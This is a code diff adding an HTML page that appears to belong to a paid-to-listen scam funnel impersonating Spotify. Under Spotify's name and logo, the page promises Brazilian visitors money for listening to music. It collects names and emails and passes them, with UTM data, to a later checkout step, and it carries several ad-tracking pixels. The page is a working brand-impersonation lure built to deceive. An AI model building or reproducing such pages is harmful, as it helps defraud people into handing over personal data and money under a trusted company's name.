@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+
+    <script async="" src="https://www.clarity.ms/tag/uem62uib5t"></script>
+    <script type="text/javascript">
+        (function (c, l, a, r, i, t, y) {
+            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+        })(window, document, "clarity", "script", "uem62uib5t");
+    </script>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+
+    <style>
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            background-color: rgb(24, 24, 24);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .centralizado {
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+        }
+
+        * {
+            font-family: "Poppins", sans-serif;
+            color: white;
+        }
+
+        #logocentral {
+            width: 90px;
+        }
+
+        #textoprincipalsptfy {
+            font-size: 23px;
+            font-weight: 700;
+        }
+
+        #descricaoiniciospotify {
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            font-size: 15px;
+        }
+
+        #descricaoiniciospotifyy {
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        #logincadastro {
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        #nomeInput,
+        #sobrenomeInput,
+        #emailInput {
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 10px;
+            margin-top: 9px;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+        }
+
+        /* #botaoprocximetapa:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        } */
+
+        #botaoprocximetapa {
+            padding: 13px 10px;
+            background-color: rgb(1, 214, 97);
+            color: white;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: 1px solid rgb(1, 214, 97);
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="centralizado">
+        <!-- LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO -->
+        <p id="textoprincipalsptfy">
+            Seja bem-vindo ao<br>Spotify Brasil
+        </p>
+
+        <!-- DESCRIÇÃO -->
+        <p id="descricaoiniciospotify">
+            Faça seu <b>cadastro</b> e ganhe <br>dinheiro ouvindo músicas de <br>grandes artistas e ajude a moldar o
+            futuro da música no Brasil!
+        </p>
+
+        <!-- FORMULÁRIO -->
+        <div id="logincadastro">
+            <input type="text" placeholder="Nome" id="nomeInput">
+            <input type="text" placeholder="Sobrenome" id="sobrenomeInput">
+            <input type="text" placeholder="Seu melhor e-mail aqui" id="emailInput">
+        </div>
+
+        <!-- MENSAGEM DE ERRO -->
+        <div id="msgErro"
+            style="display:none; background-color: #ff4444; color: white; padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 13px; width: 90%; text-align: center; font-weight: 500;">
+            Por favor, preencha todos os dados corretamente antes de continuar.
+        </div>
+
+        <!-- BOTÃO -->
+        <button onclick="redirecionar()" id="botaoprocximetapa">Cadastrar e ganhar</button>
+
+        <!-- SCRIPT DE REDIRECIONAMENTO COM UTMS -->
+        <script>
+            const nomeInput = document.getElementById('nomeInput');
+            const sobrenomeInput = document.getElementById('sobrenomeInput');
+            const emailInput = document.getElementById('emailInput');
+            const button = document.getElementById('botaoprocximetapa');
+
+            function redirecionar() {
+                const nome = document.getElementById('nomeInput').value;
+                const sobrenome = document.getElementById('sobrenomeInput').value;
+                const email = document.getElementById('emailInput').value;
+
+                // Validação
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (nome.trim() === '' || sobrenome.trim() === '' || !emailRegex.test(email.trim())) {
+                    const msgErro = document.getElementById('msgErro');
+                    msgErro.style.display = 'block';
+                    setTimeout(() => { msgErro.style.display = 'none'; }, 3000);
+                    return;
+                }
+
+                const fullName = `${nome} ${sobrenome}`.trim();
+
+                // Salva os dados usando nosso utilitário
+                if (window.CheckoutUtils) {
+                    CheckoutUtils.saveData({
+                        name: fullName,
+                        email: email
+                    });
+                } else {
+                    // Fallback visual caso o script falhe ou não carregue
+                    localStorage.setItem('lead_full_name', fullName);
+                    localStorage.setItem('lead_email', email);
+                }
+
+                // Monta as UTMs capturadas
+                const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content']
+                    .map(param => {
+                        const value = localStorage.getItem(param);
+                        return value ? `${param}=${encodeURIComponent(value)}` : '';
+                    })
+                    .filter(Boolean)
+                    .join('&');
+
+                // Monta URL Destino com redundância de parâmetros
+                let urlDestino = `./02/?nome=${encodeURIComponent(fullName)}&email=${encodeURIComponent(email)}`;
+                if (utmParams) urlDestino += '&' + utmParams;
+
+                window.location.href = urlDestino;
+            }
+        </script>
+
+        <p id="descricaoiniciospotifyy">
+            Este site é protegido pelo reCAPTCHA e está sujeito à <b
+                style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b> e aos <b
+                style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+        </p>
+    </div>
+
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "690d62a14026406721407adb";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+ <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+  n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '4053625494857896');
+  fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=4053625494857896&ev=PageView&noscript=1"/></noscript>
+  <!-- End Meta Pixel Code -->
+
+    <script src="../js/checkout-prefill.js"></script>
+</body>
+
+</html>
